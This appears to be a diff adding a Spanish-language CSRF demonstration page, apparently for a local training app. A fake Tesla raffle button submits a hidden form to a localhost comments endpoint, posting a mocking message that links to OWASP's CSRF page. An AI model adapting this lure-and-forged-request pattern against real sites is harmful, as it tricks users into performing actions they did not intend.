@@ -1,0 +1,30 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta charset="utf-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Ataque CSRF</title>
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+		  integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+</head>
+<body>
+	<div class="container">
+		<h2>¿Quiere participar en el sorteo?</h2>
+
+		<p>Este maravilloso <strong>Tesla</strong> puede ser tuyo</p>
+
+		<img style="text-align:center" src="../Images/Tesla.png" width="300" />
+
+		<form action="http://localhost:52735/Comments/Post" method="POST">
+			<input type="hidden" id="CommentId" name="CommentId" value="0" />
+			<input type="hidden" id="Subject" name="Subject" value="Estimado programador:">
+			<input type="hidden" id="Body" name="Body" value="Tu seguridad es una basura. Si quieres hacerlo bien, consulta: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">
+			<input type="hidden" id="Url" name="Url" value="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)" />
+			<br />
+			<input style="text-align:center" class="btn btn-primary" type="submit" value="Por supuesto que quiero concursar" />
+		</form>
+	</div>
+</body>
+</html>
+
